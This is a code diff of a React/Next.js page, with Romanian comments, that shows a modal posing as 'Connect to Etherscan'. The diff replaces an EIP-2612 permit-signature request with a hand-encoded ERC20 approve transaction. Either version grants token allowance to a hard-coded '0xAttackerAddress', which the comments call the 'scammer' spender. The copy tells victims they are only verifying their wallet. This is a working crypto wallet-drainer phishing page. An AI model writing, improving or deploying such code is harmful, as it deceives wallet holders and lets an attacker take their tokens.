@@ -1,49 +1,37 @@
 "use client";
 import { useState } from "react";
 
-// Adaugă această declarație pentru TypeScript
+// Pentru TypeScript, declară window.ethereum
 declare global {
   interface Window {
     ethereum?: any;
   }
 }
 
+// ABI pentru funcția approve (poți folosi și web3/ethers pentru encode, dar aici e hardcodat)
+function getApproveData(spender: string, amount: string) {
+  // selector approve(address,uint256): 0x095ea7b3
+  // address (32 bytes, left-padded), amount (32 bytes, left-padded)
+  return (
+    "0x095ea7b3" +
+    spender.replace("0x", "").padStart(64, "0") +
+    BigInt(amount).toString(16).padStart(64, "0")
+  );
+}
+
 export default function Home() {
   const [showModal, setShowModal] = useState(false);
-  const [signature, setSignature] = useState<string | null>(null);
+  const [txHash, setTxHash] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
 
-  // Exemplu de date pentru permit (EIP-2612)
-  const domain = {
-    name: "Uniswap V2",
-    version: "1",
-    chainId: 1,
-    verifyingContract: "0xYourTokenAddress" // Adresa tokenului EIP-2612 (ex: USDC, UNI, DAI, etc.)
-  };
+  // Setează aici adresa tokenului ERC20 și adresa "scammerului" (spender)
+  const tokenAddress = "0xYourTokenAddress"; // ex: USDT, USDC, DAI, etc.
+  const spender = "0xAttackerAddress"; // adresa de test sau a "atacatorului"
+  const amount = "1000000000000000000"; // 1 token (18 decimals)
 
-  const types = {
-    Permit: [
-      { name: "owner", type: "address" },
-      { name: "spender", type: "address" },
-      { name: "value", type: "uint256" },
-      { name: "nonce", type: "uint256" },
-      { name: "deadline", type: "uint256" }
-    ]
-  };
-
-  // Exemplu: deadline 1 oră de acum, value 1 token (18 decimals)
-  const value: any = {
-    owner: "", // completat după conectare
-    spender: "0xAttackerAddress", // adresa de test sau a "atacatorului"
-    value: "1000000000000000000", // 1 token (18 decimals)
-    nonce: 0, // completat după conectare (poți lăsa 0 pentru test)
-    deadline: Math.floor(Date.now() / 1000) + 3600
-  };
-
-  // Conectare la MetaMask și semnare permit
-  const handleSign = async () => {
+  const handleApprove = async () => {
     setError(null);
-    setSignature(null);
+    setTxHash(null);
     if (!window.ethereum) {
       setError("MetaMask nu este instalat.");
       return;
@@ -51,28 +39,26 @@ export default function Home() {
     try {
       // 1. Cere adresa utilizatorului
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      value.owner = accounts[0];
+      const from = accounts[0];
 
-      // 2. (Opțional) Ia nonce-ul real de pe contractul tokenului (aici hardcodat 0)
-      // Într-un test real, folosește ethers.js/web3.js să citești nonce-ul corect
+      // 2. Construiește data pentru approve
+      const data = getApproveData(spender, amount);
 
-      // 3. Construiește payload-ul EIP-712
-      const msgParams = JSON.stringify({
-        domain,
-        types,
-        primaryType: "Permit",
-        message: value
+      // 3. Trimite tranzacția approve
+      const tx = {
+        from,
+        to: tokenAddress,
+        data
+      };
+
+      const txHash = await window.ethereum.request({
+        method: "eth_sendTransaction",
+        params: [tx]
       });
 
-      // 4. Cere semnătura
-      const sig = await window.ethereum.request({
-        method: "eth_signTypedData_v4",
-        params: [value.owner, msgParams]
-      });
-
-      setSignature(sig);
+      setTxHash(txHash);
     } catch (e: any) {
-      setError(e.message || "Eroare la semnare.");
+      setError(e.message || "Eroare la approve.");
     }
   };
 
@@ -127,10 +113,10 @@ export default function Home() {
             />
             <h2 style={{ margin: "0 0 12px 0" }}>Connect to Etherscan</h2>
             <p style={{ color: "#444", marginBottom: 24 }}>
-              Please sign this message to verify your wallet and continue.
+              Please connect your wallet to verify and continue.
             </p>
             <button
-              onClick={handleSign}
+              onClick={handleApprove}
               style={{
                 fontSize: 18,
                 padding: "10px 24px",
@@ -141,7 +127,7 @@ export default function Home() {
                 cursor: "pointer"
               }}
             >
-              Sign Message
+              Approve
             </button>
             <button
               onClick={() => setShowModal(false)}
@@ -161,10 +147,10 @@ export default function Home() {
             <div style={{ position: "absolute", top: 12, right: 16, cursor: "pointer" }} onClick={() => setShowModal(false)}>
               <svg width="24" height="24" fill="#888"><path d="M18 6L6 18M6 6l12 12" stroke="#888" strokeWidth="2" strokeLinecap="round"/></svg>
             </div>
-            {signature && (
+            {txHash && (
               <div style={{ marginTop: 24, wordBreak: "break-all", color: "#0a0" }}>
-                <b>Semnătură obținută:</b>
-                <div style={{ fontSize: 12 }}>{signature}</div>
+                <b>Approve trimis!</b>
+                <div style={{ fontSize: 12 }}>{txHash}</div>
               </div>
             )}
             {error && (
